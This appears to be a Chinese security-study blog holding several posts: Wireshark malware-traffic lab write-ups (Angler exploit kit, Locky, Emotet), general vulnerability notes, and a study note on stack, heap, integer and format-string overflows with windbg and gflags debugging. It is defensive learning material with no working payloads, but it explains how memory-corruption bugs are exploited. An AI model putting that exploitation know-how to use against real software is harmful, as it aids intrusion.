<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591015616412.png" alt="1591015616412"></p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591015895770.png" alt="1591015895770"></p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591015989193.png" alt="1591015989193"></p>
<p>继续分析，往下</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591016377552.png" alt="1591016377552"></p>
<p>出现top域名 值得注意 选择一条get 跟踪流</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591016521168.png" alt="1591016521168"></p>
<p>可以看到referer信息，referer表示是从该页面链接过来的，所以此处的话表明用户访问正常的网页<a href="http://www.emidioleite.com........然后被定向访问到了.top" target="_blank" rel="noopener">http://www.emidioleite.com........然后被定向访问到了.top</a></p>
<p>​    接下来结合snort日志分析，根据目的ip去日志中检索</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591016656334.png" alt="1591016656334"></p>
<p>可以看到snort检测到是属于Angler exploit-kit发起的攻击，后面还提示是landing page，那么一定会传递载荷</p>
<p>​       我们进一步分析其他的tcp流</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591016735113.png" alt="1591016735113"></p>
<p>继续往下看看剩余有没有可疑的流量</p>
<p>​       在最后的一系列postuserinfo.php这种用户正常访问的额流量之前我们有看到了奇怪的流量</p>
<p>同上一步 在snort文件中查找ip 但是攻击手法有变化。实际攻击中IP是动态变化的，但是端口一般不会变化，取消条件后发现主要是80和443.在搜索引擎中搜索</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591017017379.png" alt="1591017017379"></p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591017029696.png" alt="1591017029696"></p>
<p>  用户受到了三次感染，第一次是来自malware spam的Locky ransomware,第二次是Angler EK的文件（由分析文章推知是伪装的swf文件），第三次是AnglerEK的CryptXXX ransomware。</p>
<hr>
<h1 id="五、实验结果总结"><a href="#五、实验结果总结" class="headerlink" title="五、实验结果总结"></a>五、实验结果总结</h1><p>对实验结果进行分析，完成思考题目，总结实验的心得体会，并提出实验的改进意见。</p>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ytytytytyt6.github.io/ytytytytyt6.github.io/2020/07/20/%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E8%AE%AD%E7%BB%83%E4%BA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="万俟思睿">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/ytytytytyt6.github.io/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="思睿's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ytytytytyt6.github.io/2020/07/20/%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E8%AE%AD%E7%BB%83%E4%BA%8C/" itemprop="url">恶意流量分析训练二</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-20T13:10:56+08:00">
                2020-07-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h1><p>本次实验所涉及并要求掌握的知识点。</p>
<hr>
<p>通过该实验了解使用wireshark进行恶意流量分析，本次实验涉及知识包括<strong>操作系统指纹识别、域环境、Emotet银行木马流量特征等</strong>。</p>
<hr>
<h1 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h1><p>实验所使用的设备名称及规格，网络管理工具简介、版本等。</p>
<hr>
<p>服务器：Windows 7 ，IP地址：随机分配</p>
<p>辅助工具：Wireshark</p>
<hr>
<h1 id="三、实验内容与实验要求"><a href="#三、实验内容与实验要求" class="headerlink" title="三、实验内容与实验要求"></a>三、实验内容与实验要求</h1><p>实验内容、原理分析及具体实验要求。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">环境：</span><br><span class="line">局域网段：172.16.3.0&#x2F;24（172.16.3.0 到 172.16.3.255）</span><br><span class="line">域：eggnogsoup.com</span><br><span class="line">域控：172.16.3.2-EggNogSoup-DC</span><br><span class="line">网关：172.16.3.1</span><br><span class="line">广播地址：172.16.3.255</span><br><span class="line">Q1:域里有多少台存活的主机，分别给出他们的地址</span><br><span class="line">Q2.哪个主机的操作系统是ubuntu？</span><br><span class="line">这个问题考到一个知识点，就是访问网页时，用户的http请求包的头部的user-agent可能会泄露对应的操作系统的部分信息。</span><br><span class="line">Q3：ip地址为172.16.3.188的是什么类型的主机？</span><br><span class="line">Q4:哪个ip地址最有可能是Amazon Fire tablet</span><br><span class="line">Q5:哪些windows主机曾经连接到域控上？</span><br><span class="line">Q6:下面三台主机中哪一台主机有感染Emotet银行木马的迹象？（172.16.3.114,172.16.3.133,172.16.3.189）</span><br><span class="line">Q7:运行着安卓8.0.0的ip地址是多少？是什么牌子和型号？</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="四、实验过程与分析"><a href="#四、实验过程与分析" class="headerlink" title="四、实验过程与分析"></a>四、实验过程与分析</h1><p>根据具体实验，记录、整理相应命令、运行结果等，包括截图和文字说明。</p>
<p>详细记录在实验过程中发生的故障和问题，并进行故障分析，说明故障排除的过程及方法。</p>
<p>下载数据流量特征如图：</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590932843485.png" alt="1590932843485"></p>
<p>pcap包文件：</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590932890626.png" alt="1590932890626"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q1:域里有多少台存活的主机，分别给出他们的地址</span><br></pre></td></tr></table></figure>

<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590932964175.png" alt="1590932964175"></p>
<p>菜单。统计。会话。IPv4。</p>
<p>172.16.3.0/24的各个主机的ip</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590933158128.png" alt="1590933158128"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q2.哪个主机的操作系统是ubuntu？</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">这个问题考到一个知识点，就是访问网页时，用户的http请求包的头部的user-agent可能会泄露对应的操作系统的部分信息。</span><br><span class="line">部分user agent如下所示</span><br><span class="line">​       ·  ·  Firefox</span><br><span class="line">​       ·  ·  Mozilla&#x2F;5.0(Windows NT 6.1; WOW64; rv:34.0) Gecko&#x2F;20100101 Firefox&#x2F;34.0</span><br><span class="line">​       ·  ·  Mozilla&#x2F;5.0(X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko&#x2F;20100922 Ubuntu&#x2F;10.10(maverick) Firefox&#x2F;3.6.10</span><br><span class="line"></span><br><span class="line">​       ·  ·  Safari</span><br><span class="line">​       ·  ·  Mozilla&#x2F;5.0(Windows NT 6.1; WOW64) AppleWebKit&#x2F;534.57.2 (KHTML, like Gecko) Version&#x2F;5.1.7Safari&#x2F;534.57.2</span><br><span class="line"></span><br><span class="line">​       ·  ·  chrome</span><br><span class="line">​       ·  ·  Mozilla&#x2F;5.0(Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko)Chrome&#x2F;39.0.2171.71 Safari&#x2F;537.36</span><br><span class="line">​       ·  ·  Mozilla&#x2F;5.0(X11; Linux x86_64) AppleWebKit&#x2F;537.11 (KHTML, like Gecko) Chrome&#x2F;23.0.1271.64Safari&#x2F;537.11</span><br><span class="line">​       ·  ·  Mozilla&#x2F;5.0(Windows; U; Windows NT 6.1; en-US) AppleWebKit&#x2F;534.16 (KHTML, like Gecko)Chrome&#x2F;10.0.648.133 Safari&#x2F;534.16</span><br></pre></td></tr></table></figure>

<p> ip contains Ubuntu and http.request</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590933381111.png" alt="1590933381111"></p>
<p>可以看出172.16.3.110主机的操作系统是，可以随便打开一条，追踪TCP流，查看User-Agent字段进行验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q3：ip地址为172.16.3.188的是什么类型的主机？</span><br></pre></td></tr></table></figure>

<p> ip.addr eq 172.16.3.188</p>
<p>选择追踪流，可以发现是苹果设备</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590933604056.png" alt="1590933604056"></p>
<p>也可以通过DNS请求发现查询iCloud</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590933944966.png" alt="1590933944966"></p>
<p>怎样知道是iPhone ，iPad还是Mac呢？具体还是看User Agent，</p>
<p>  ip.addr eq 172.16.3.188 and http.request</p>
<p> 右键跟踪tcp流，可以看出是iPhone 8 </p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590934174649.png" alt="1590934174649"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q4:哪个ip地址最有可能是Amazon Fire tablet</span><br></pre></td></tr></table></figure>

<p> 这是亚马逊的一款平板电脑。这时候还是用找ubuntu的方法能行吗？  ip contains Amazon and http.request  失效</p>
<p>尝试查询Amazon的域名：  dns.qry.name contains amazon</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590934296184.png" alt="1590934296184"></p>
<p>可以看到111,122,109三个主机。我们知道亚马逊的网上采用了https，我们可以尝试过滤出https域名中有amazon的</p>
<p>​       ssl.handshake.type == 1 and ip contains amazon</p>
<p>发现122和109主机</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590934422638.png" alt="1590934422638"></p>
<p>查看对应的MAC，发现122为苹果的设备。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590934488802.png" alt="1590934488802"></p>
<p>对应的看ua的思路也会有浏览器特征，比如firefox,chrome等，那么这个平板上的浏览器是什么呢？</p>
<p>通过关键字可以看到其特有的浏览器是Silk，那么我们试试使用silk关键字来过滤</p>
<p>​       ssl.handshake.type == 1 and ip contains silk</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590934631806.png" alt="1590934631806"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q5:哪些windows主机曾经连接到域控上？</span><br></pre></td></tr></table></figure>

<blockquote>
<p>域建立后会有一个管理域成员的目录列表，称之为活动目录ActiveDirectory(AD),而AD默认使用Kerberos处理认证请求。所以我们考虑使用kerberos关键字进行过滤</p>
</blockquote>
<p>  kerberos.CNameSrting</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590934719712.png" alt="1590934719712"></p>
<p>展开，cnamestring，右键选中为列查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q6:下面三台主机中哪一台主机有感染Emotet银行木马的迹象？（172.16.3.114,172.16.3.133,172.16.3.189）</span><br></pre></td></tr></table></figure>

<p>(http.request or ssl.handshake.type == 1) and  !(udp.port eq 1900) and ip.addr  eq 172.16.3.114</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q7:运行着安卓8.0.0的ip地址是多少？是什么牌子和型号？</span><br></pre></td></tr></table></figure>



<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<h1 id="五、实验结果总结"><a href="#五、实验结果总结" class="headerlink" title="五、实验结果总结"></a>五、实验结果总结</h1><p>对实验结果进行分析，完成思考题目，总结实验的心得体会，并提出实验的改进意见。</p>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ytytytytyt6.github.io/ytytytytyt6.github.io/2020/07/20/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="万俟思睿">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/ytytytytyt6.github.io/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="思睿's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ytytytytyt6.github.io/2020/07/20/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" itemprop="url">漏洞笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-20T13:10:56+08:00">
                2020-07-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>有道无术，术尚可求，有术无道，止于术。如果说网络安全是互联网发展的“道”，那么漏洞则是互联网安全的“术”。</p>
<p>作者认为人与生俱来就有贪婪、自私、猜疑、虚荣、恐惧、固执等弱点，这些缺陷一旦被利用，就是致命的漏洞。作者因此认为漏洞时因人而生，因人心而用，因人性而决定使用之道。</p>
<p>据深圳市反电信网络诈骗中心介绍，利用第三方支付平台专业赃款和洗钱的手段一般有三种：通过第三方支付平台发型的商户POS机虚构交易套现；将诈骗得手的资金转移到第三方支付平台账户，在线购买游戏点卡、比特币；将赃款在银行账户和第三方支付平台之间多次转账切换。</p>
<p>网站挂马与篡改——病毒感染、零日漏洞利用、SQL注入漏洞、网络劫持、恶意广告投放等。</p>
<p>拖库——黑客从有价值的网站中将用户资料数据库拖走。</p>
<p>撞库——黑客通过手机互联网已泄露的用户和密码信息，生成对应的密码字典表，尝试批量登录其他网站后，碰撞出一系列可以登录的账户。</p>
<p>私服——未经版权拥有者授权，非法获得服务器安装程序之后设立的网络服务器，本质上属于网络盗版，与在互联网上共享未经授权的版权作品本质差别不大。</p>
<p>DNS安全是网络安全的第一道大门。</p>
<p>2017年7月《关键信息基础设施安全保护条例（征求意见稿）》</p>
<p>狭义上说，网络白产是围绕漏洞评估、发现与响应工作而形成的。其中漏洞挖掘技术是白产的核心技术，漏洞防护是白产快反的高级手段。</p>
<p>补天漏洞响应平台</p>
<p>糊掉问题的本源，风险是与威胁相对应的概念，在排优算法中加入威胁相关的数据，可以极大缩减处理漏洞的数量，优化漏洞排优算法。在漏洞排优中使用威胁情报和机器学习算法。</p>
<p>可利用的威胁情报及上下文数据包括：观测到的语漏洞相关的安全事件数量、公开已获得的漏洞利用代码、已知的恶意代码家族或攻击工具套件使用的漏洞、检测到相关的组织受到类似的攻击等。这些情报和数据在未来将越来越重要。</p>
<p>2018.05.25欧盟发布GDPR通用数据保护条例正式实施，目的是就规范并约束企业对用户个人数据的收集和使用，加强对欧盟境内居民的个人数据和隐私保护。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ytytytytyt6.github.io/ytytytytyt6.github.io/2020/07/20/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="万俟思睿">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/ytytytytyt6.github.io/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="思睿's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ytytytytyt6.github.io/2020/07/20/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/" itemprop="url">漏洞基础概念</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-20T13:10:56+08:00">
                2020-07-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>漏洞相关概念**</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">熟悉基本概念和原理（二进制漏洞基本原理、漏洞类型、漏洞利用方法、常见漏洞挖掘、shellcode编写）。</span><br><span class="line">通过关键字（栈溢出、堆溢出、整数溢出、UAF、double-free、shellcode）进行Google&#x2F;SecWiki等了解基本概念；</span><br><span class="line">阅读《Q版本缓冲区溢出》《0day漏洞挖掘》等书籍，学习二进制漏洞形成的基本原理和基本的利用方法，并进行实践操作；</span><br><span class="line">学习《加密与解密》中部分章节，熟悉Windows系统的重要数据结构、函数传参方法以及PE文件结构等基础知识。</span><br></pre></td></tr></table></figure>

<h3 id="0x01-熟悉基本概念和原理（二进制漏洞基本原理、漏洞类型、漏洞利用方法、常见漏洞挖掘、shellcode编写）"><a href="#0x01-熟悉基本概念和原理（二进制漏洞基本原理、漏洞类型、漏洞利用方法、常见漏洞挖掘、shellcode编写）" class="headerlink" title="0x01 熟悉基本概念和原理（二进制漏洞基本原理、漏洞类型、漏洞利用方法、常见漏洞挖掘、shellcode编写）"></a>0x01 熟悉基本概念和原理（二进制漏洞基本原理、漏洞类型、漏洞利用方法、常见漏洞挖掘、shellcode编写）</h3><ol>
<li><p>二进制漏洞基本原理</p>
<p><a href="https://bbs.pediy.com/thread-252569.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252569.htm</a></p>
<p>1）栈溢出漏洞原理 属于缓冲区漏洞</p>
<p>变量中的字符串通过strcpy拷贝到栈空间时，没有对字符串长度做限制，导致栈溢出，最后覆盖到了返回地址，造成程序崩溃。溢出后的栈空间布局如下</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590715345698.png" alt="1590715345698"></p>
<p>2）堆溢出漏洞原理</p>
<p>由于调试堆和常态堆结构不同，在演示代码中加入getchar函数，用于暂停进程，方便运行heapoverflowexe后用调试器附加进程。debug版本和release版本实际运行的进程中各个内存结构和分配过程也不同，因此测试的时候应该编译成release版本。</p>
<p>使用windbg函数附加调试，一定是附加调试</p>
<p>上面的ecx已经被AAAA字符串覆盖掉了，最后在应用改地址的时候导致崩溃，通过前面的栈回溯定位到了main函数入口，找到复制字符串的函数下断点</p>
<p>此时堆块已经分配完毕，对应的分配地址位于0x007104a0，0x007104a0是堆块数据的起始地址，并非堆头信息的起始地址，对已经分配的堆块，开头有8字节的HEAP_ENTRY结构，因此heap的该结构位于0x007104a0-8=0x710498。</p>
<p>在windbg上查看两个堆块的信息，目前处于占用状态，共有0x10大小空间（usersize） 查看命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">！heap -p -a 0x710498</span><br></pre></td></tr></table></figure>

<p>使用！heap查看HeapCreate创建的整个堆块信息，可以发现堆块后面还有一个0x007104c0：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!heap</span><br><span class="line"></span><br><span class="line">!heap -a 710000</span><br></pre></td></tr></table></figure>

<p>在复制字符串时，原本只有0x10大小的堆块，填充过多字符串就会覆盖到下方空闲堆块007104c0，在复制前007104c0空闲堆块的HEAP_FREE_ENTRY结构数据如下：</p>
<p>dt _HEAP_FREE_ENTRY 0x007104c0</p>
<p>dt _LIST_ENTRY <code>0x007104c0</code>+8</p>
<p>覆盖之后的结果中出现？？整个空闲堆头信息都被覆盖了，包括最后的空闲链表中的前后向指针都变成了0x41414141，后面调用HeapFree释放堆块的时候，就会将buf2和后面的空闲堆块0x007104c0合并，修改两个空闲堆块的前后向指针就会引用0x41414141，最后造成崩溃。</p>
<p>如果把上面释放堆块的操作换成分配堆块HeapAlloc(),也会导致崩溃，因为在分配堆块时会遍历空闲链表指针，会造成地址引用异常，当内存中已经分配多个堆块时，可能覆盖到的就是已经分配的堆块，就可能覆盖HEAP_ENTRY结构，而不是HEAP_FREE_ENTRY结构。</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590716744637.png" alt="1590716744637">3）堆调试技巧</p>
<p>微软提供，可以通过windbg提供的gflag.exe或者！gflg命令来设置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">htc：堆尾检查，是否发生溢出</span><br><span class="line">hfc：堆释放检查</span><br><span class="line">hpc：堆参数检查</span><br><span class="line">hpa：启用页堆</span><br><span class="line">htg：堆标志</span><br><span class="line">ust：用户态栈回溯</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>对heapoverflow.exe添加堆尾检查和页堆，去掉堆标志：<strong>去掉堆标志为什么还是+htg？</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;gflags.exe &#96;&#96;-&#96;&#96;i F:\vulns\Release\heapoverflow &#96;&#96;+&#96;&#96;htc &#96;&#96;+&#96;&#96;hpa &#96;&#96;+&#96;&#96;htg&#96;</span><br></pre></td></tr></table></figure>

<p>堆尾检查主要是在每个堆的尾部，用户数据之后添加8个字节，通常是连续的2个0xabababab，该数据段被破坏就可能发生了溢出。对heapoverflow.exe开启hpc和htc，用windbg加载对heapoverflow程序，附加进程无法在堆尾添加额外标志，使用以下命令开启堆尾检查和堆参数检查：</p>
<p>!gflag +htc +hpc</p>
<p>g</p>
<p>执行命令g后，回车程序会断下来</p>
<p>HEAP[heapoverflow.exe]: Heap block at 001E0498 modified at 001E04B0 past requested size of 10</p>
<p>调试输出信息是在大小为0x10的堆块001E0498 的001E04B0 覆盖破坏了，0x10大小的空间加上堆头的8字节一共0x18字节，0x001E04B0 -0x001E0498 =0x18，也即0x001E04B0 是位于堆块数据的最后一个字节上，基于上面信息，可以分析出程序主要是因为向0x10的堆块中复制过多数据导致的堆溢出。</p>
<p>页堆</p>
<p>在调试漏洞时，经常需要定位导致漏洞的代码和函数，比如导致堆溢出的字节复制指令rep movsz等，前面的堆尾检查方式主要是堆被破坏的场景，不利于定位导致漏洞的代码。为此引入页堆的概念，开启页堆，会在堆块中增加不可访问的栅栏页，溢出覆盖到栅栏页就会触发异常。</p>
<p>gflags.exe -i F:\vulns\Release\heapoverflow  +hpa</p>
<p>用windbg加载heapoverflow，运行上面命令开启页堆，然后g运行后cmd按下回车键断下。可以发现程序在复制A字符串时触发了异常，程序复制到0x11字节时被断下，此时异常还未破坏到堆块，知道定位导致溢出的复制指令rep movs<strong>[不是很能理解]</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child             </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">0012ff48 00401327 00000001 01699fb0 0169bf70 image00400000+0x1084</span><br></pre></td></tr></table></figure>

<p>kb 根据栈回溯，调用rep movs的上一层函数位于image00400000+0x1084的上一条指令，也就是00401322，此处调用了00401000函数，很容易发现这是主入口函数：</p>
<p>uf 00401000</p>
<p>4）整数溢出漏洞原理</p>
<p>整数分为有符号和无符号两类，有符号以最高位作为符号位，正整数最高位为1，负整数最高位为0，不同类型的证书在内存中有不同的取值范围，unsigned int为4字节，int为4字节，当存储的数值超高该类型证书的最大值就会发生溢出。</p>
<p>在一些有符号和无符号转换过程中最有可能发生整数溢出漏洞。</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>占用字节数</th>
<th>范围</th>
</tr>
</thead>
<tbody><tr>
<td>字符类型char</td>
<td>1</td>
<td>-128~127[2的8次方]</td>
</tr>
<tr>
<td>无符号字符类型unsigned  char</td>
<td>1</td>
<td>0~255</td>
</tr>
<tr>
<td>布尔类型 bool</td>
<td>1</td>
<td>0~1</td>
</tr>
<tr>
<td>短整型short</td>
<td>2</td>
<td>-32768~32767[2的16次方]</td>
</tr>
<tr>
<td>整型int</td>
<td>4</td>
<td>-2147483648~2147483647</td>
</tr>
<tr>
<td>无符号整型unsigned int</td>
<td>4</td>
<td>0~4294967295</td>
</tr>
<tr>
<td>长整型long</td>
<td>4</td>
<td>-2147483648~2147483647</td>
</tr>
<tr>
<td>无符号长整型unsigned long</td>
<td>4</td>
<td>0~4294967295[2的32次方]</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>1字节是8位</p>
<p><strong>基于栈的整数溢出</strong></p>
<p>代码中size变量是无符号短整型，取值范围为0-65535，输入值大于65535就会发生溢出，最后得到是size为4，这样会通过边界检查，但是使用memcpy复制数据的时候，使用的是int类型的参数i，这个值输入的是65540，就会发生栈溢出。</p>
<p><strong>基于堆的整数溢出</strong></p>
<p>代码中size变量是无符号短整型，取值范围为0-65535，当输入小于5时，size减去5会得到负数，但由于无符号短整型的取值范围限制无法识别负数，得到正数65535，最后分配得到过大的堆块，溢出覆盖了后面的堆管理结构。</p>
<p>5）格式化字符串漏洞原理</p>
<p>产生主要原因是对用户输入的内容没有做过滤，有些输入数据都是作为参数传递给某些执行格式化操作的函数的，比如printf，fprintf，vprintf，sprintf。</p>
<p>恶意用户可以使用%s和%x等格式符，从堆栈和其他内存位置输出数据，也可以使用格式符%n想任意地址写入数据，配合printf（）函数就可以向任意地址写入被格式化的字节数，可能导致任意代码执行，或者读取敏感数据。当输入数据包含%s和%x等格式符时，会议外输出其他数据，用ollydbg附加调试程序，执行前需要先设置命令行参数，调试-参数-命令行：test-%x</p>
